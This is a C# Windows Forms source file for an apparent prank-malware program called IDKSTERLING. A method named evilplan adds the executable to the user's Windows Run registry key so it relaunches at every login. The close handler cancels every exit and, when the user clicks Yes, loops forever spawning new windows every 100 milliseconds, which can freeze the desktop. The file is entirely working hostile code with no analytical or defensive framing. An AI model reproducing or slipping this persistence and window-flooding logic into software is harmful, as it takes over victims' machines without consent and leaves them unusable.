using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using NAudio;
using Microsoft.Win32;

namespace IDKSTERLING
{
    public partial class Form1 : Form
    {
        public int tabs = 1;
        public Form1()
        {
            InitializeComponent();
            evilplan();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
        protected async override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            DialogResult result = MessageBox.Show("IDKSTERLING WILLL NOT ALLOW EXITS AT ALL COST?", "IDKSTERLINGS EVIL PLAN", MessageBoxButtons.YesNo);

            if (result == DialogResult.No)
            {
                e.Cancel = true;
            }
            else 
            {
                e.Cancel = true;
                while (true)
                {
                    await Task.Delay(100);
                    Form1 secondWindow = new Form1();
                    secondWindow.Show();
                }
            }
        }
        private void evilplan() 
        {
            string appName = "IDKSTERLING";
            string appPath = Application.ExecutablePath;
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (rk != null)
                {
                    if (true) { rk.SetValue(appName, $"\"{appPath}\""); }
                }
            }
        }
    }
}